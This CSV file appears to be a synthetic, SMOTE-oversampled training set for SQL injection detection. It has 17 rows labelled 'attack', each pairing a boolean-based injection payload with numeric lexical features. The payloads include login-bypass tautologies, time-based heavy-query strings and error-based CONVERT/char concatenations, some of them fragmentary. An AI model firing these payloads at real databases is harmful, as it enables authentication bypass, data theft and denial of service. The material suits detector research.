id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000340,0.353116279300028,120.44214690732865,32.11053672683216,3.5910176516878205,38.88429381465729,10.552683634160807,52.22624291217487,18.778926546335676,0.32266892979034856,0.0874933176764792,0.4338518389363284,0.15598591359684388,2.0,3.1105367268321613,0.0,0.9999999999999999,0.0,1.0,0.0,9.778926546335677,0.8894632731678387,0.0,1.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.8894632731678387,0.0,0.0,0.0,1.0,0.11053672683216131,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000012,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",nearest_attack_euclidean,R000399,0.03015656641691143,131.58354351605806,28.91670870321161,3.9208716482274357,72.0,10.750126109634834,36.83341740642322,12.0,0.5472431917706884,0.08163908779498685,0.2799105218058767,0.09120719862844806,0.0,0.0,0.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000013,attack,boolean,"1""  )   where 9962  =  9962 and 4595  =  4595#",nearest_attack_euclidean,R000696,0.1568131148083347,47.301752028853954,18.325438007213485,3.4253953419393723,8.976314021640455,17.0,16.325438007213485,5.0,0.18780049467175108,0.3606562864369899,0.3454678405274385,0.10607537836382055,0.0,1.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000014,attack,boolean,-9358' or 9887  =  2569--,nearest_attack_euclidean,R000223,0.1727945827029735,24.924067895034312,13.07593210496568,3.3818176349377476,2.0,12.0,6.000000000000007,4.9240678950343195,0.08025310701655228,0.48151864209931367,0.2407593210496568,0.1974689298344773,0.9240678950343191,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,0.9240678950343191,0.0,1.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000015,attack,boolean,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000329,0.3385324268019347,246.2338081605917,37.74768688008453,3.7139629566404704,72.0,27.0,102.73843440042265,44.49537376016906,0.2925138856568341,0.1096927071213128,0.41712875107877173,0.18066465614308141,0.8738434400422654,0.0,2.0,0.0,0.0,1.0,0.0,23.74768688008453,0.8738434400422654,2.0,4.0,13.0,0.8738434400422654,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,8.0
SMOTE_000016,attack,boolean,"-5898""   )    )    as fycd where 7135  =  7135 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000722,0.03319621669987936,390.9852994182337,33.95589825470098,3.432083356706154,102.0,58.0,177.0,53.98529941823366,0.2608793983824524,0.14834318731551216,0.4527024854283733,0.13807492887366216,0.0,0.9852994182336616,3.0,0.0,0.0,3.0,0.0,36.0,0.0,0.0,1.0,16.0,0.0,0.9852994182336616,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000017,attack,boolean,"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv",nearest_attack_euclidean,R000644,0.6218662229370756,65.34419380482606,17.655806195173952,3.0351789329473275,15.376775219304193,9.0,31.311612390347904,9.655806195173954,0.23512160279422092,0.13773945355630898,0.47931016401356186,0.14782877963590826,0.0,3.9999999999999996,0.0,0.0,0.0,1.655806195173952,0.0,4.0,0.0,0.0,0.0,1.6558061951739522,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000018,attack,boolean,1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',nearest_attack_euclidean,R000092,0.7750662477800933,74.07259621172024,28.37353584705276,3.9426154858082074,19.37353584705276,18.83138112940368,25.5784528235092,10.2892264117546,0.2642804437500749,0.25580927628680805,0.34293176966905226,0.13697851029406477,2.9156905647018396,0.0,0.0,0.0,0.0,2.0,0.0,2.9156905647018396,0.0,0.0,0.4578452823509196,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000019,attack,boolean,end and '%'  =  ',nearest_attack_euclidean,R000579,1.3505291773957906,15.221952379462962,7.110976189731481,2.4946175082720696,5.110976189731481,0.0,5.555488094865744,4.555488094865741,0.33282751560478463,0.0,0.3670207390766508,0.3001517453185646,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.5554880948657395,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.1102230246251565e-16,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.5554880948657396,0.4445119051342605,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000020,attack,boolean,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",nearest_attack_euclidean,R000196,1.7436260465426696,368.9666605761752,30.691025406775967,3.327584957285705,100.83717784743178,47.0,168.9833302880876,52.146152440655804,0.27330061143331097,0.127521722346307,0.45794496390706896,0.14123270231331309,2.764101627103871,0.0,0.0,0.0,0.0,2.6910254067759682,0.0,35.382050813551935,0.0,0.0,1.0,12.691025406775967,0.6910254067759679,0.0,0.0,0.3089745932240321,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.691025406775968,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.69102540677597
SMOTE_000021,attack,boolean,"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""prhp""  =  ""prhp",nearest_attack_euclidean,R000681,1.0835155987481893,375.9641862020319,41.339302299661355,3.6076639964138413,112.2855816027092,35.0,170.0,58.678604599322696,0.29860093042463454,0.09309931645708086,0.4521966799343928,0.1561030731838918,0.0,3.9999999999999996,0.0,0.0,0.0,2.0,0.0,36.0,0.6786045993227003,2.0,4.0,12.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,12.0
SMOTE_000022,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000401,0.7984206035531035,92.52256519262653,24.826263969848544,3.2967938450946925,21.0,13.0,44.08754656616181,14.435018626464725,0.2282587622637078,0.14130304330610485,0.4751574871523061,0.15528070727788124,4.0,0.0,0.0,0.0,0.0,1.6087546566161812,0.0,7.2175093132323624,0.0,0.6087546566161811,1.0,1.6087546566161812,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000023,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000655,1.2946173327589816,133.37381107467533,27.813094462662335,3.2493730486511283,37.165081432900436,13.0,66.0,17.20872964177489,0.2781476620700393,0.0975171591925793,0.4950871159007872,0.12924806283659412,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,1.2087296417748905,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000024,attack,boolean,1'+  (  select nsri where 1202  =  1202 and 4595  =  4595#,nearest_attack_euclidean,R000768,0.7466671285818774,54.541061848918574,22.702898193344463,3.851258335985799,17.567632731114823,15.270530924459283,16.13526546222964,5.567632731114822,0.3256090250920055,0.2760643440833427,0.2966532616493036,0.1016733691753482,1.0,0.0,0.0,0.0,0.0,1.7838163655574106,0.0,1.0,0.0,0.0,0.0,2.5676327311148213,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.7838163655574105,0.0,0.7838163655574104,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.567632731114821
SMOTE_000025,attack,boolean,"1""   )    )    as lslk where 6729  =  6729 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000660,0.15293805000074215,274.93133177874256,38.0,3.8135367273082226,83.0,35.0,112.0,44.931331778742525,0.3018938216637607,0.1273046235931521,0.40737479549808675,0.1634267592450004,0.0,0.9313317787425275,2.0,0.0,0.0,2.0,0.0,24.0,0.0,2.0,4.0,14.0,0.0,0.9313317787425276,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
SMOTE_000026,attack,boolean,admin'  )   or   (  '1'  =  '1'#,nearest_attack_euclidean,R000044,2.2009497381148453,34.388338103617286,14.477667620723455,2.971630507293505,4.611661896382721,6.77667620723455,14.95533524144691,8.044664758553091,0.14008007935720124,0.18756500204752627,0.43507938705714466,0.23727553153812786,3.0893295171061794,0.0,0.47766762072345514,0.0,0.0,1.0,0.0,2.0,0.4776676207234551,0.0,0.0,1.4776676207234551,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000027,attack,boolean,"1  )   where 8691  =  8691 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000598,0.2562571994016408,131.256963530289,36.36188483669878,3.85867238913123,38.17130902019266,23.0,52.723769673397555,17.361884836698778,0.29041268633064876,0.1754157070485489,0.40187502364392447,0.13229658297687788,2.361884836698777,0.0,2.0,0.9999999999999999,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
